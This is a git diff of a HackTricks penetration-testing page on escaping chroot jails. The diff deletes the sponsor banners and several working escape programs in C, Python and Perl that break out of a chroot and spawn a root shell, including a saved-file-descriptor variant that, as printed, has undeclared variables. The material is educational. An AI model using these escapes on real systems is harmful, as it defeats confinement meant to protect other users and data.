@@ -1,18 +1,5 @@
 # Escaping from Jails
 
-<details>
-
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
-
-Other ways to support HackTricks:
-
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
-
-</details>
 
 ## **GTFOBins**
 
@@ -37,64 +24,8 @@ This occurs because usually chroot DOESN'T move your working directory to the in
 
 Usually you won't find the `chroot` binary inside a chroot jail, but you **could compile, upload and execute** a binary:
 
-<details>
 
-<summary>C: break_chroot.c</summary>
 
-```c
-#include <sys/stat.h>
-#include <stdlib.h>
-#include <unistd.h>
-
-//gcc break_chroot.c -o break_chroot
-
-int main(void)
-{
-    mkdir("chroot-dir", 0755);
-    chroot("chroot-dir");
-    for(int i = 0; i < 1000; i++) {
-        chdir("..");
-    }
-    chroot(".");
-    system("/bin/bash");
-}
-```
-
-</details>
-
-<details>
-
-<summary>Python</summary>
-
-```python
-#!/usr/bin/python
-import os
-os.mkdir("chroot-dir")
-os.chroot("chroot-dir")
-for i in range(1000):
-    os.chdir("..")
-os.chroot(".")
-os.system("/bin/bash")
-```
-
-</details>
-
-<details>
-
-<summary>Perl</summary>
-
-```perl
-#!/usr/bin/perl
-mkdir "chroot-dir";
-chroot "chroot-dir";
-foreach my $i (0..1000) {
-    chdir ".."
-}
-chroot ".";
-system("/bin/bash");
-```
-
-</details>
 
 ### Root + Saved fd
 
@@ -102,32 +33,6 @@ system("/bin/bash");
 This is similar to the previous case, but in this case the **attacker stores a file descriptor to the current directory** and then **creates the chroot in a new folder**. Finally, as he has **access** to that **FD** **outside** of the chroot, he access it and he **escapes**.
 {% endhint %}
 
-<details>
-
-<summary>C: break_chroot.c</summary>
-
-```c
-#include <sys/stat.h>
-#include <stdlib.h>
-#include <unistd.h>
-
-//gcc break_chroot.c -o break_chroot
-
-int main(void)
-{
-    mkdir("tmpdir", 0755);
-    dir_fd = open(".", O_RDONLY);
-    if(chroot("tmpdir")){
-        perror("chroot");
-    }
-    fchdir(dir_fd);
-    close(dir_fd);  
-    for(x = 0; x < 1000; x++) chdir("..");
-    chroot(".");
-}
-```
-
-</details>
 
 ### Root + Fork + UDS (Unix Domain Sockets)
 
@@ -305,16 +210,3 @@ debug.debug()
 
 * [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slides: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))
 
-<details>
-
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
-
-Other ways to support HackTricks:
-
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
-
-</details>
